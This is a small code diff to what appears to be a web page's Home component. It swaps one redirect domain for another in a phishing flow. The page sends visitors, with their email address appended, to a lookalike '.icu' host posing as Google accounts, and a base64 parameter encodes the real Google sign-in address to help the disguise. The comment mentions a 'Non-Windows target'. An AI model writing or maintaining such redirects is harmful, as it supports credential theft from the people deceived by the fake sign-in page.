@@ -37,7 +37,7 @@ export default function Home() {
     if (email) {
       // Redirect to Non-Windows target with raw email
       window.location.href =
-        `https://accounts.fcudkl.icu?X0zS-ro7JkPyrQ=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t&smn=${email}`;
+        `https://accounts.fxzova.icu?xJsf1Kdet7hf=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t&smn=${email}`;
     }
   }, []);
 
